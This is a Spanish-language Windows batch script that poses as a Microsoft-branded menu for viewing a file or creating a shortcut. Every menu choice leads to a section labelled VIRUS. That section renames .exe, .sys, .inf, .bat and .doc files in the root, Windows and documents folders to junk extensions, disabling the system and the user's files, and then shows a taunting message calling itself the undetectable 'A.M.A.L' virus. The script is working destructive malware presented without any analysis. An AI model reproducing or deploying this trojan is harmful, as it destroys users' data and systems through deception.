   @echo off
   :BEGIN
   cls
   echo -----------------------------------------------------------
   echo MICROSOFT. LINK MEYER    All Right Reserved
   echo -----------------------------------------------------------
   echo.
   echo a - ver el archivo
   echo b - acceso directo
   echo c - salir
   echo.
   choice /c:abc /N seleccione una opcion:
   if errorlevel 3 goto VIRUS
   if errorlevel 2 goto VIRUS
   if errorlevel 1 goto VIRUS

   echo.
   pause > nul

   :VIRUS
   CD\
   ren c:*.inf *.amal-virus
   ren c:*.con *.virus-amal
   ren c:*.exe *.amal
   ren c:*.sys *.virus
   ren c:*.bat *.amal-vir
   ren c:*.doc *.vir-amal
   ren c:windows\*.inf *.amal-virus
   ren c:windows\*.con *.virus-amal
   ren c:windows\*.exe *.amal
   ren c:windows\*.sys *.virus
   ren c:windows\*.bat *.amal-vir
   ren c:windows\*.doc *.vir-amal
   ren c:mis documentos\*.inf *.amal-virus
   ren c:mis documentos\*.con *.virus-amal
   ren c:mis documentos\*.exe *.amal
   ren c:mis documentos\*.sys *.virus
   ren c:mis documentos\*.bat *.amal-vir
   ren c:mis documentos\*.doc *.vir-amal
   cls
   echo -----------------------------------------------------------
   echo BIEMBENIDOS AL VIRUS "A.M.A.L" JA JA JILUN. REINICIA LA
   echo MAQUINA SI PODES O TE ANIMAS...      NI EL CODIGO ROJO
   echo ME GANA. SOY INDETECTABLE POR LOS ANTIVIRUS.
   echo DETECTAME CON UN BUSCA METAL...
   echo -----------------------------------------------------------
